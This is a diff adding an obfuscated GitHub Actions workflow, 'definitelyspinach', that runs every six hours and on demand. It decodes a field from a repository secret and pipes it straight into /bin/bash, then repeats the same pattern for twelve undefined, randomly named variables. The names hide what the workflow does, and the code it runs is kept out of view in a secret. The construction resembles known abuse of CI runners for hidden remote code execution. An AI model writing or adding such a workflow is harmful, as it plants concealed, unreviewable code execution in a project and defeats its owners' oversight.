@@ -1,0 +1,30 @@
+name: definitelyspinach
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: definitelyspinach
+        env:
+          nofxs1710: ${{ secrets.nofxs1710 }}
+        run: |
+          echo $nofxs1710 | jq -r .csbhe95 | /bin/bash
+          echo $hmhk72813 | jq -r .vsgm66 | /bin/bash
+          echo $nhs210 | jq -r .wug4 | /bin/bash
+          echo $l98 | jq -r .j51795 | /bin/bash
+          echo $rgx3 | jq -r .ywnu06 | /bin/bash
+          echo $wsvd996 | jq -r .gpq2504 | /bin/bash
+          echo $i1 | jq -r .rrro656 | /bin/bash
+          echo $vepr6 | jq -r .ct76240 | /bin/bash
+          echo $vx71793 | jq -r .thy00 | /bin/bash
+          echo $yjqzm5 | jq -r .wnp3826 | /bin/bash
+          echo $gfol9213 | jq -r .wdzkf57879 | /bin/bash
+          echo $trnyw802 | jq -r .wqu01552 | /bin/bash
+          echo $xyve8 | jq -r .g3602 | /bin/bash
+
